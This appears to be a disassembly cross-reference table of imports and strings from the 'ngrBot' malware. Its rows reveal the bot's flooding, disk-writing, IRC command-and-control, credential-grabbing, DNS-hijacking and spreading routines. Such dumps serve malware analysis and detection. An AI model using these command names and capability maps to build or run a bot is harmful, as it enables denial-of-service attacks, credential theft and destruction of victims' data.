reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x17759549	0x17761188	import	0x17759430	KERNEL32.dll.Sleep
0x17759564	0x17761174	import	0x17759430	KERNEL32.dll.GetTickCount
0x177595e0	0x17761174	import	0x17759580	KERNEL32.dll.GetTickCount
0x177595fc	0x17761120	import	0x17759580	KERNEL32.dll.lstrcpyA
0x17759602	0x177629e0	string	0x17759580	Mozilla/4.0
0x1775963c	0x177629d8	string	0x17759580	POST
0x1775964a	0x177629d8	string	0x17759580	POST
0x1775967f	0x17762968	string	0x17759580	%s / ?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nKeep-Alive: 300\r\nConnection: keep-alive\r\nContent-Length: 42\r\n
0x1775970b	0x17761180	import	0x177596b0	KERNEL32.dll.HeapFree
0x17759728	0x177610a0	import	0x177596b0	KERNEL32.dll.lstrcpynA
0x17759751	0x17761180	import	0x177596b0	KERNEL32.dll.HeapFree
0x17759770	0x17761174	import	0x177596b0	KERNEL32.dll.GetTickCount
0x177597ba	0x17765ee4	string	0x177596b0	[SYN]: Starting flood on "%s:%d" for %d second(s)
0x177597f0	0x17765f18	string	0x177596b0	[SYN]: Finished flood on "%s:%d"
0x1775981c	0x17761180	import	0x177596b0	KERNEL32.dll.HeapFree
0x1775988b	0x17761180	import	0x17759830	KERNEL32.dll.HeapFree
0x177598a8	0x177610a0	import	0x17759830	KERNEL32.dll.lstrcpynA
0x177598d1	0x17761180	import	0x17759830	KERNEL32.dll.HeapFree
0x177598f0	0x17761174	import	0x17759830	KERNEL32.dll.GetTickCount
0x1775993a	0x17765e8c	string	0x17759830	[UDP]: Starting flood on "%s:%d" for %d second(s)
0x17759970	0x17765ec0	string	0x17759830	[UDP]: Finished flood on "%s:%d"
0x1775999c	0x17761180	import	0x17759830	KERNEL32.dll.HeapFree
0x17759a2d	0x17761174	import	0x177599b0	KERNEL32.dll.GetTickCount
0x17759a60	0x17761174	import	0x177599b0	KERNEL32.dll.GetTickCount
0x17759abe	0x17761188	import	0x177599b0	KERNEL32.dll.Sleep
0x17759ae7	0x17761120	import	0x177599b0	KERNEL32.dll.lstrcpyA
0x17759af0	0x17762a08	string	0x177599b0	X-a: b\r\n
0x17759b00	0x177629f0	string	0x177599b0	Connection: Close\r\n\r\n
0x17759b0f	0x17761184	import	0x177599b0	KERNEL32.dll.lstrlenA
0x17759b51	0x17761188	import	0x177599b0	KERNEL32.dll.Sleep
0x17759b5e	0x17761184	import	0x177599b0	KERNEL32.dll.lstrlenA
0x17759b66	0x17761174	import	0x177599b0	KERNEL32.dll.GetTickCount
0x17759b7f	0x17761188	import	0x177599b0	KERNEL32.dll.Sleep
0x17759bd2	0x17761174	import	0x177599b0	KERNEL32.dll.GetTickCount
0x17759be4	0x17761184	import	0x177599b0	KERNEL32.dll.lstrlenA
0x17759c43	0x17761174	import	0x177599b0	KERNEL32.dll.GetTickCount
0x17759c9a	0x17761180	import	0x17759c60	KERNEL32.dll.HeapFree
0x17759cb3	0x17761120	import	0x17759c60	KERNEL32.dll.lstrcpyA
0x17759cc4	0x177610a0	import	0x17759c60	KERNEL32.dll.lstrcpynA
0x17759cf9	0x17765e30	string	0x17759c60	[Slowloris]: Starting flood on "%s" for %d minute(s)
0x17759d45	0x17765e68	string	0x17759c60	[Slowloris]: Finished flood on "%s"
0x17759d73	0x17761180	import	0x17759c60	KERNEL32.dll.HeapFree
0x17759da7	0x17761094	import	0x17759d90	KERNEL32.dll.VirtualAlloc
0x17759dd0	0x17762a14	string	0x17759d90	\\.\PHYSICALDRIVE0
0x17759dd5	0x17761110	import	0x17759d90	KERNEL32.dll.CreateFileA
0x17759e02	0x17761098	import	0x17759d90	KERNEL32.dll.DeviceIoControl
0x17759e21	0x1776109c	import	0x17759d90	KERNEL32.dll.SetFilePointer
0x17759e2a	0x17761164	import	0x17759d90	KERNEL32.dll.WriteFile
0x17759e56	0x1776109c	import	0x17759d90	KERNEL32.dll.SetFilePointer
0x17759ea2	0x17761098	import	0x17759d90	KERNEL32.dll.DeviceIoControl
0x17759eec	0x17762a28	string	0x17759ec0	00100
0x17759f09	0x17762a14	string	0x17759ec0	\\.\PHYSICALDRIVE0
0x17759f16	0x17761110	import	0x17759ec0	KERNEL32.dll.CreateFileA
0x17759f2b	0x17761098	import	0x17759ec0	KERNEL32.dll.DeviceIoControl
0x17759f5a	0x17761164	import	0x17759ec0	KERNEL32.dll.WriteFile
0x17759f77	0x17761150	import	0x17759ec0	KERNEL32.dll.CloseHandle
0x1775a0a2	0x17761158	import	0x1775a080	KERNEL32.dll.CreateFileW
0x1775a0c0	0x17761164	import	0x1775a080	KERNEL32.dll.WriteFile
0x1775a0cb	0x17761150	import	0x1775a080	KERNEL32.dll.CloseHandle
0x1775a0d8	0x17761150	import	0x1775a080	KERNEL32.dll.CloseHandle
0x1775a184	0x177610c8	import	0x1775a150	KERNEL32.dll.GetWindowsDirectoryW
0x1775a2ab	0x17761090	import	0x1775a260	KERNEL32.dll.CreateProcessW
0x1775a2c5	0x17761174	import	0x1775a2c0	KERNEL32.dll.GetTickCount
0x1775a39f	0x17761184	import	0x1775a310	KERNEL32.dll.lstrlenA
0x1775a3a8	0x177657a0	string	0x1775a310	mine
0x1775a3b0	0x177657a0	string	0x1775a310	mine
0x1775a3bb	0x17766904	string	0x1775a310	\\.\pipe\%08x_ipc
0x1775a3fd	0x177657a0	string	0x1775a310	mine
0x1775a40e	0x177657a0	string	0x1775a310	mine
0x1775a436	0x1776119c	import	0x1775a310	KERNEL32.dll.EnterCriticalSection
0x1775a452	0x17761110	import	0x1775a310	KERNEL32.dll.CreateFileA
0x1775a464	0x17761198	import	0x1775a310	KERNEL32.dll.LeaveCriticalSection
0x1775a484	0x17761164	import	0x1775a310	KERNEL32.dll.WriteFile
0x1775a48b	0x17761150	import	0x1775a310	KERNEL32.dll.CloseHandle
0x1775a496	0x17761188	import	0x1775a310	KERNEL32.dll.Sleep
0x1775a4a1	0x17761198	import	0x1775a310	KERNEL32.dll.LeaveCriticalSection
0x1775a557	0x17762a48	string	0x1775a550	NtShutdownSystem
0x1775a55c	0x177616e8	string	0x1775a550	ntdll.dll
0x1775a57a	0x17761024	import	0x1775a550	ADVAPI32.dll.OpenProcessToken
0x1775a588	0x17762a34	string	0x1775a550	SeShutdownPrivilege
0x1775a58f	0x17761028	import	0x1775a550	ADVAPI32.dll.LookupPrivilegeValueA
0x1775a5b3	0x1776102c	import	0x1775a550	ADVAPI32.dll.AdjustTokenPrivileges
0x1775a5b9	0x1776116c	import	0x1775a550	KERNEL32.dll.GetLastError
0x1775a61e	0x1775a64a	string	0x1775a5d0	jjj偨痧樗樀 blocks=Basic Latin,CJK Unified Ideographs
0x1775a659	0x177610cc	import	0x1775a5d0	KERNEL32.dll.CreateThread
0x1775a661	0x17762ad4	string	0x1775a5d0	ngrBot Error
0x1775a666	0x17762a60	string	0x1775a5d0	This binary is invalid.\r\n\r\nMain reasons:\r\n- you stupid cracker\r\n- you stupid cracker...\r\n- you stupid cracker?!\r\n
0x1775a66f	0x177612a4	import	0x1775a5d0	USER32.dll.MessageBoxA
0x1775a678	0x177610f8	import	0x1775a5d0	KERNEL32.dll.WaitForSingleObject
0x1775a680	0x1776108c	import	0x1775a5d0	KERNEL32.dll.ExitProcess
0x1775a6df	0x17761238	import	0x1775a690	SHELL32.dll.SHGetSpecialFolderPathW
0x1775a6ed	0x17761728	string	0x1775a690	Internet Explorer\iexplore.exe
0x1775a6f9	0x17761240	import	0x1775a690	SHLWAPI.dll.PathAppendW
0x1775a70a	0x17762af0	string	0x1775a690	"%s" %S
0x1775a77f	0x17761090	import	0x1775a690	KERNEL32.dll.CreateProcessW
0x1775a7aa	0x17761174	import	0x1775a790	KERNEL32.dll.GetTickCount
0x1775a7dc	0x17761188	import	0x1775a790	KERNEL32.dll.Sleep
0x1775a819	0x17761174	import	0x1775a800	KERNEL32.dll.GetTickCount
0x1775a859	0x17761188	import	0x1775a800	KERNEL32.dll.Sleep
0x1775a8b1	0x17761534	string	0x1775a880	msnu
0x1775a8bd	0x17761330	string	0x1775a880	pdef
0x1775a8c9	0x17761b04	string	0x1775a880	ffgrab
0x1775a8d5	0x17761b0c	string	0x1775a880	iegrab
0x1775a8e1	0x17761a9c	string	0x1775a880	ftpgrab
0x1775a8ed	0x17761a68	string	0x1775a880	popgrab
0x1775a8fc	0x177613e4	string	0x1775a880	bdns
0x1775a908	0x17762b1c	string	0x1775a880	usbi
0x1775a914	0x17762b14	string	0x1775a880	httpi
0x1775a946	0x17762b04	string	0x1775a880	http
0x1775a956	0x17762b04	string	0x1775a880	http
0x1775a970	0x17762b30	string	0x1775a970	DnsFlushResolverCache
0x1775a975	0x17762b24	string	0x1775a970	dnsapi.dll
0x1775a9ed	0x17761090	import	0x1775a990	KERNEL32.dll.CreateProcessW
0x1775aa39	0x177629e0	string	0x1775aa10	Mozilla/4.0
0x1775aa45	0x17761120	import	0x1775aa10	KERNEL32.dll.lstrcpyA
0x1775aa60	0x177612b8	import	0x1775aa10	WININET.dll.InternetOpenA
0x1775aa78	0x17761184	import	0x1775aa10	KERNEL32.dll.lstrlenA
0x1775aa8c	0x177612b4	import	0x1775aa10	WININET.dll.InternetOpenUrlA
0x1775aac0	0x177612b0	import	0x1775aa10	WININET.dll.HttpQueryInfoA
0x1775aae2	0x177612ac	import	0x1775aa10	WININET.dll.InternetQueryDataAvailable
0x1775ab00	0x177612c8	import	0x1775aa10	WININET.dll.InternetReadFile
0x1775abe7	0x177612c4	import	0x1775aa10	WININET.dll.InternetCloseHandle
0x1775ac1a	0x17761178	import	0x1775ac00	KERNEL32.dll.HeapAlloc
0x1775ac29	0x177612bc	import	0x1775ac00	WININET.dll.HttpQueryInfoW
0x1775ac44	0x1776116c	import	0x1775ac00	KERNEL32.dll.GetLastError
0x1775ac5e	0x177611a0	import	0x1775ac00	KERNEL32.dll.HeapReAlloc
0x1775ac80	0x17762b48	string	0x1775ac00	POST
0x1775ac85	0x17761134	import	0x1775ac00	KERNEL32.dll.lstrcmpW
0x1775ac99	0x17761180	import	0x1775ac00	KERNEL32.dll.HeapFree
0x1775acb2	0x17761180	import	0x1775ac00	KERNEL32.dll.HeapFree
0x1775ad0a	0x17761178	import	0x1775acd0	KERNEL32.dll.HeapAlloc
0x1775ad1a	0x177612c0	import	0x1775acd0	WININET.dll.InternetQueryOptionW
0x1775ad31	0x1776116c	import	0x1775acd0	KERNEL32.dll.GetLastError
0x1775ad4f	0x177611a0	import	0x1775acd0	KERNEL32.dll.HeapReAlloc
0x1775ad80	0x1776112c	import	0x1775acd0	KERNEL32.dll.WideCharToMultiByte
0x1775adb3	0x17761120	import	0x1775acd0	KERNEL32.dll.lstrcpyA
0x1775ade6	0x17761180	import	0x1775acd0	KERNEL32.dll.HeapFree
0x1775ae05	0x17761184	import	0x1775ae00	KERNEL32.dll.lstrlenA
0x1775ae13	0x17761178	import	0x1775ae00	KERNEL32.dll.HeapAlloc
0x1775ae69	0x17761120	import	0x1775ae00	KERNEL32.dll.lstrcpyA
0x1775ae7f	0x17761088	import	0x1775ae00	KERNEL32.dll.lstrcatA
0x1775aeb0	0x1775af0a	string	0x1775ae00	hT+v
0x1775aed5	0x17761180	import	0x1775ae00	KERNEL32.dll.HeapFree
0x1775aeeb	0x17761180	import	0x1775ae00	KERNEL32.dll.HeapFree
0x1775af58	0x17761120	import	0x1775ae00	KERNEL32.dll.lstrcpyA
0x1775af70	0x17761180	import	0x1775ae00	KERNEL32.dll.HeapFree
0x1775afaf	0x17761184	import	0x1775afa0	KERNEL32.dll.lstrlenA
0x1775afcb	0x17761178	import	0x1775afa0	KERNEL32.dll.HeapAlloc
0x1775b024	0x17762b88	string	0x1775afa0	POST /%1023s
0x1775b055	0x17762b7c	string	0x1775afa0	Host:
0x1775b08e	0x177610a0	import	0x1775afa0	KERNEL32.dll.lstrcpynA
0x1775b0d5	0x17761178	import	0x1775afa0	KERNEL32.dll.HeapAlloc
0x1775b0e3	0x17762b74	string	0x1775afa0	HTTP
0x1775b0ff	0x17762b68	string	0x1775afa0	http://%s/
0x1775b11e	0x17762b58	string	0x1775afa0	http://%s/%s
0x1775b13c	0x17761180	import	0x1775afa0	KERNEL32.dll.HeapFree
0x1775b16a	0x17761184	import	0x1775b160	KERNEL32.dll.lstrlenA
0x1775b186	0x17761178	import	0x1775b160	KERNEL32.dll.HeapAlloc
0x1775b199	0x17762b98	string	0x1775b160	\r\n\r\n
0x1775b1d2	0x17761178	import	0x1775b160	KERNEL32.dll.HeapAlloc
0x1775b1e5	0x177610a0	import	0x1775b160	KERNEL32.dll.lstrcpynA
0x1775b1f8	0x17761180	import	0x1775b160	KERNEL32.dll.HeapFree
0x1775b2ee	0x1775b2b0	string	0x1775b290	<%u2
0x1775b312	0x1776117c	import	0x1775b300	KERNEL32.dll.GetProcessHeap
0x1775b319	0x17761178	import	0x1775b300	KERNEL32.dll.HeapAlloc
0x1775b366	0x17762bb4	string	0x1775b300	lol.exe
0x1775b387	0x177610c8	import	0x1775b300	KERNEL32.dll.GetWindowsDirectoryW
0x1775b3a1	0x177610b8	import	0x1775b300	KERNEL32.dll.lstrcpynW
0x1775b3bb	0x17761084	import	0x1775b300	KERNEL32.dll.GetVolumeInformationW
0x1775b3cd	0x17761184	import	0x1775b300	KERNEL32.dll.lstrlenA
0x1775b3d3	0x177657a0	string	0x1775b300	mine
0x1775b3ea	0x177657a0	string	0x1775b300	mine
0x1775b45b	0x17762ba0	string	0x1775b300	.exe
0x1775b461	0x177610bc	import	0x1775b300	KERNEL32.dll.lstrcatW
0x1775b4a9	0x17762c18	string	0x1775b480	isadmin
0x1775b4ae	0x17762c10	string	0x1775b480	admin
0x1775b4fe	0x17761120	import	0x1775b480	KERNEL32.dll.lstrcpyA
0x1775b536	0x17761178	import	0x1775b480	KERNEL32.dll.HeapAlloc
0x1775b550	0x177610d8	import	0x1775b480	KERNEL32.dll.GetVersionExA
0x1775b60d	0x17761178	import	0x1775b480	KERNEL32.dll.HeapAlloc
0x1775b620	0x177668e8	string	0x1775b480	http://api.wipmania.com/
0x1775b63b	0x17762be8	string	0x1775b480	<br>
0x1775b650	0x17761184	import	0x1775b480	KERNEL32.dll.lstrlenA
0x1775b65f	0x17761184	import	0x1775b480	KERNEL32.dll.lstrlenA
0x1775b67d	0x17761080	import	0x1775b480	KERNEL32.dll.GetLocaleInfoA
0x1775b6a8	0x17761128	import	0x1775b480	KERNEL32.dll.lstrcmpA
0x1775b6c5	0x17761080	import	0x1775b480	KERNEL32.dll.GetLocaleInfoA
0x1775b6f9	0x17761080	import	0x1775b480	KERNEL32.dll.GetLocaleInfoA
0x1775b741	0x17761178	import	0x1775b480	KERNEL32.dll.HeapAlloc
0x1775b7f1	0x17762bd0	string	0x1775b480	n%s{%s|%s%s}%s
0x1775b80b	0x17762bc4	string	0x1775b480	{%s|%s%s}%s
0x1775b8be	0x17762bd0	string	0x1775b480	n%s{%s|%s%s}%s
0x1775b8d5	0x17762bc4	string	0x1775b480	{%s|%s%s}%s
0x1775b94b	0x17762c20	string	0x1775b900	127.0.0.1
0x1775b975	0x17761188	import	0x1775b900	KERNEL32.dll.Sleep
0x1775b9bc	0x1776119c	import	0x1775b990	KERNEL32.dll.EnterCriticalSection
0x1775b9d1	0x177612a0	import	0x1775b990	USER32.dll.wvsprintfA
0x1775b9f2	0x17761198	import	0x1775b990	KERNEL32.dll.LeaveCriticalSection
0x1775ba42	0x177612a0	import	0x1775ba00	USER32.dll.wvsprintfA
0x1775ba56	0x17765d4c	string	0x1775ba00	PRIVMSG %s :%s\r\n
0x1775ba7f	0x17765c54	string	0x1775ba70	PASS %s\r\n
0x1775ba9c	0x17765d24	string	0x1775ba70	NICK %s\r\n
0x1775bab4	0x17765d10	string	0x1775ba70	USER %s 0 0 :%s\r\n
0x1775bb52	0x17761184	import	0x1775bb30	KERNEL32.dll.lstrlenA
0x1775bba0	0x17761128	import	0x1775bb80	KERNEL32.dll.lstrcmpA
0x1775bbff	0x17761128	import	0x1775bbb0	KERNEL32.dll.lstrcmpA
0x1775bc2c	0x177657a0	string	0x1775bbb0	mine
0x1775bc36	0x17765d88	string	0x1775bbb0	[v="%s" c="%s" h="%s" p="%S"]
0x1775bc89	0x17762cf4	string	0x1775bbb0	reconnecting
0x1775bc8e	0x17765d60	string	0x1775bbb0	QUIT :%s\r\n
0x1775bcc3	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775bce1	0x17761180	import	0x1775bbb0	KERNEL32.dll.HeapFree
0x1775bcec	0x17762cf4	string	0x1775bbb0	reconnecting
0x1775bcf1	0x17765d60	string	0x1775bbb0	QUIT :%s\r\n
0x1775bd28	0x17762ce8	string	0x1775bbb0	exiting
0x1775bd2d	0x17765d60	string	0x1775bbb0	QUIT :%s\r\n
0x1775bd5a	0x17762cdc	string	0x1775bbb0	removing
0x1775bd5f	0x17765d60	string	0x1775bbb0	QUIT :%s\r\n
0x1775bdb2	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775bdc6	0x17761088	import	0x1775bbb0	KERNEL32.dll.lstrcatA
0x1775bdd5	0x17765d30	string	0x1775bbb0	JOIN %s %s\r\n
0x1775be0c	0x17762ccc	string	0x1775bbb0	#new
0x1775be18	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775be2a	0x17765d30	string	0x1775bbb0	JOIN %s %s\r\n
0x1775be72	0x17762cbc	string	0x1775bbb0	#admin
0x1775be79	0x17762cb4	string	0x1775bbb0	#user
0x1775be7f	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775be91	0x17765d30	string	0x1775bbb0	JOIN %s %s\r\n
0x1775becb	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775bee7	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775befa	0x17761088	import	0x1775bbb0	KERNEL32.dll.lstrcatA
0x1775bf0c	0x17765d30	string	0x1775bbb0	JOIN %s %s\r\n
0x1775bf5f	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775bf73	0x17761088	import	0x1775bbb0	KERNEL32.dll.lstrcatA
0x1775bf82	0x17765d40	string	0x1775bbb0	PART %s\r\n
0x1775bfa6	0x17762ccc	string	0x1775bbb0	#new
0x1775bfb2	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775bfc4	0x17765d40	string	0x1775bbb0	PART %s\r\n
0x1775c00c	0x17762cbc	string	0x1775bbb0	#admin
0x1775c013	0x17762cb4	string	0x1775bbb0	#user
0x1775c019	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775c02b	0x17765d40	string	0x1775bbb0	PART %s\r\n
0x1775c065	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775c081	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775c094	0x17761088	import	0x1775bbb0	KERNEL32.dll.lstrcatA
0x1775c0a6	0x17765d40	string	0x1775bbb0	PART %s\r\n
0x1775c0c3	0x17765874	string	0x1775bbb0	stop
0x1775c0e3	0x17765840	string	0x1775bbb0	stats
0x1775c124	0x17766054	string	0x1775bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x1775c156	0x17766080	string	0x1775bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x1775c192	0x17766054	string	0x1775bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x1775c1b9	0x17766080	string	0x1775bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x1775c1d2	0x17765850	string	0x1775bbb0	logins
0x1775c225	0x17761180	import	0x1775bbb0	KERNEL32.dll.HeapFree
0x1775c25e	0x17762c88	string	0x1775bbb0	[Logins]: Cleared %d logins
0x1775c283	0x17762c80	string	0x1775bbb0	%s|%s
0x1775c2c2	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775c2d2	0x17761178	import	0x1775bbb0	KERNEL32.dll.HeapAlloc
0x1775c2ea	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775c321	0x177660d0	string	0x1775bbb0	[RSOCK4]: Stopped rsock4
0x1775c33f	0x17765848	string	0x1775bbb0	speed
0x1775c354	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775c3fd	0x177657f0	string	0x1775bbb0	jps獵 blocks=Basic Latin,CJK Unified Ideographs
0x1775c449	0x17765d30	string	0x1775bbb0	JOIN %s %s\r\n
0x1775c4bf	0x17765d30	string	0x1775bbb0	JOIN %s %s\r\n
0x1775c550	0x17765d40	string	0x1775bbb0	PART %s\r\n
0x1775c572	0x17765d40	string	0x1775bbb0	PART %s\r\n
0x1775c5d0	0x17761330	string	0x1775bbb0	pdef
0x1775c5e2	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775c5f7	0x17761178	import	0x1775bbb0	KERNEL32.dll.HeapAlloc
0x1775c60e	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775c61f	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775c633	0x17761088	import	0x1775bbb0	KERNEL32.dll.lstrcatA
0x1775c642	0x17761088	import	0x1775bbb0	KERNEL32.dll.lstrcatA
0x1775c679	0x17761330	string	0x1775bbb0	pdef
0x1775c68f	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775c6d0	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775c6e0	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775c706	0x17761088	import	0x1775bbb0	KERNEL32.dll.lstrcatA
0x1775c73d	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775c743	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775c77e	0x177614f8	string	0x1775bbb0	msnmsg
0x1775c7ce	0x17765f50	string	0x1775bbb0	[MSN]: Updated MSN spread message to "%s"
0x1775c7e7	0x17765808	string	0x1775bbb0	msn.int
0x1775c826	0x17761500	string	0x1775bbb0	msnint
0x1775c859	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775c876	0x17765f7c	string	0x1775bbb0	[MSN]: Updated MSN spread interval to "%s"
0x1775c88f	0x17765810	string	0x1775bbb0	http.set
0x1775c8b5	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775c8d0	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775c8f5	0x17761088	import	0x1775bbb0	KERNEL32.dll.lstrcatA
0x1775c92c	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775c955	0x17762b04	string	0x1775bbb0	http
0x1775c972	0x17765fa8	string	0x1775bbb0	[HTTP]: Updated HTTP spread message to "%s"
0x1775c97f	0x1776581c	string	0x1775bbb0	http.int
0x1775c9c0	0x17762b04	string	0x1775bbb0	http
0x1775c9df	0x17765ff8	string	0x1775bbb0	[HTTP]: Updated HTTP spread interval to "%s"
0x1775c9f8	0x17765828	string	0x1775bbb0	http.inj
0x1775ca16	0x17762b14	string	0x1775bbb0	httpi
0x1775ca26	0x17762c70	string	0x1775bbb0	enabled
0x1775ca2b	0x17765fd4	string	0x1775bbb0	[HTTP]: Injected value is now %s.
0x1775ca43	0x17762b14	string	0x1775bbb0	httpi
0x1775ca53	0x17762c64	string	0x1775bbb0	disabled
0x1775ca58	0x17765fd4	string	0x1775bbb0	[HTTP]: Injected value is now %s.
0x1775ca71	0x17765838	string	0x1775bbb0	mdns
0x1775ca9f	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775cadd	0x17761178	import	0x1775bbb0	KERNEL32.dll.HeapAlloc
0x1775caf3	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775cb36	0x177613e4	string	0x1775bbb0	bdns
0x1775cb41	0x1775a970	string	0x1775bbb0	h0+v
0x1775cb56	0x17762c44	string	0x1775bbb0	[DNS]: Redirecting "%s" to "%s"
0x1775cb76	0x177613e4	string	0x1775bbb0	bdns
0x1775cb7b	0x177613dc	string	0x1775bbb0	block
0x1775cb85	0x1775a970	string	0x1775bbb0	h0+v
0x1775cb95	0x17766040	string	0x1775bbb0	[DNS]: Blocked "%s"
0x1775cbf2	0x1775cc0a	string	0x1775bbb0	h|bv
0x1775cbf4	0x17766028	string	0x1775bbb0	[Visit]: Visited "%s"
0x1775cc0a	0x1776627c	string	0x1775bbb0	[Visit]: Error visitng "%s"
0x1775cc3a	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775cc8b	0x17762c34	string	0x1775bbb0	%s|%s|%s
0x1775cca8	0x17762c80	string	0x1775bbb0	%s|%s
0x1775ccd4	0x17761178	import	0x1775bbb0	KERNEL32.dll.HeapAlloc
0x1775cce4	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775cd11	0x17765860	string	0x1775bbb0	slow
0x1775cd27	0x17762c80	string	0x1775bbb0	%s|%s
0x1775cd47	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775cd58	0x17761178	import	0x1775bbb0	KERNEL32.dll.HeapAlloc
0x1775cd70	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775cdfc	0x17761534	string	0x1775bbb0	msnu
0x1775ce55	0x17761330	string	0x1775bbb0	pdef
0x1775ce66	0x17761b04	string	0x1775bbb0	ffgrab
0x1775ce7b	0x17761b0c	string	0x1775bbb0	iegrab
0x1775ce8c	0x17761a9c	string	0x1775bbb0	ftpgrab
0x1775ce9d	0x17761a68	string	0x1775bbb0	popgrab
0x1775ceb2	0x177613e4	string	0x1775bbb0	bdns
0x1775cec7	0x17762b1c	string	0x1775bbb0	usbi
0x1775cf67	0x177660ac	string	0x1775bbb0	[RSOCK4]: Started rsock4 on "%s:%d"
0x1775cfe3	0x17762c34	string	0x1775bbb0	%s|%s|%s
0x1775d003	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775d013	0x17761178	import	0x1775bbb0	KERNEL32.dll.HeapAlloc
0x1775d02b	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775d043	0x17765868	string	0x1775bbb0	ssyn
0x1775d097	0x17762c34	string	0x1775bbb0	%s|%s|%s
0x1775d0b7	0x17761184	import	0x1775bbb0	KERNEL32.dll.lstrlenA
0x1775d0c8	0x17761178	import	0x1775bbb0	KERNEL32.dll.HeapAlloc
0x1775d0dc	0x17761120	import	0x1775bbb0	KERNEL32.dll.lstrcpyA
0x1775d0f0	0x177610cc	import	0x1775bbb0	KERNEL32.dll.CreateThread
0x1775d0f7	0x17761150	import	0x1775bbb0	KERNEL32.dll.CloseHandle
0x1775d145	0x17761128	import	0x1775d110	KERNEL32.dll.lstrcmpA
0x1775d18c	0x177610a0	import	0x1775d110	KERNEL32.dll.lstrcpynA
0x1775d198	0x17761184	import	0x1775d110	KERNEL32.dll.lstrlenA
0x1775d231	0x17761184	import	0x1775d220	KERNEL32.dll.lstrlenA
0x1775d243	0x17762d18	string	0x1775d220	MOTD
0x1775d2b5	0x17761128	import	0x1775d220	KERNEL32.dll.lstrcmpA
0x1775d2bb	0x17765d78	string	0x1775d220	PING
0x1775d2d1	0x17765d6c	string	0x1775d220	PONG %s\r\n
0x1775d2f6	0x1775d31d	string	0x1775d220	h\f-v
0x1775d308	0x17765d30	string	0x1775d220	JOIN %s %s\r\n
0x1775d33c	0x17765d24	string	0x1775d220	NICK %s\r\n
0x1775d351	0x177618c4	string	0x1775d220	JOIN
